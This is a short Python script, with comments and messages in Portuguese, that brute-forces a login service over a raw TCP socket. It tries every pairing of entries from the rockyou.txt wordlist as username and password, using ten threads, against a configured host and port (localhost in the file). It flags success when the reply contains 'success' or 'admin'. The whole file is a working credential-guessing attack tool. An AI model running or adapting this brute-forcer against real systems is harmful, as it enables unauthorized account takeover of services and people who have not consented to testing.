import socket
from concurrent.futures import ThreadPoolExecutor

# 🎯 Configuração
target_ip = "127.0.0.1"
target_port = 8000
max_threads = 10

# 📂 Usar a mesma wordlist para usernames e passwords
rockyou_path = "/usr/share/wordlists/rockyou.txt"

found = False

def load_wordlist(path):
    try:
        with open(path, "r", encoding="latin-1") as file:
            return [line.strip() for line in file if line.strip()]
    except Exception as e:
        print(f"Erro ao carregar '{path}': {e}")
        return []

def try_login(username, password):
    global found
    if found:
        return

    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.settimeout(3)
        client_socket.connect((target_ip, target_port))

        client_socket.sendall(username.encode() + b"\n")
        response = client_socket.recv(1024).decode(errors="ignore")

        if "password" in response.lower():
            client_socket.sendall(password.encode() + b"\n")
            response = client_socket.recv(1024).decode(errors="ignore")

            if "success" in response.lower() or "admin" in response.lower():
                print(f"\n✅ Login bem-sucedido: {username}:{password}")
                found = True

        client_socket.close()

    except Exception:
        pass  # Silencia erros

def fuzz_credentials():
    creds = load_wordlist(rockyou_path)

    print(f"🔎 Testando {len(creds)} usernames e passwords da rockyou.txt...")

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        for username in creds:
            for password in creds:
                if found:
                    return
                executor.submit(try_login, username, password)

    if not found:
        print("❌ Nenhuma combinação funcionou.")

if __name__ == "__main__":
    fuzz_credentials()
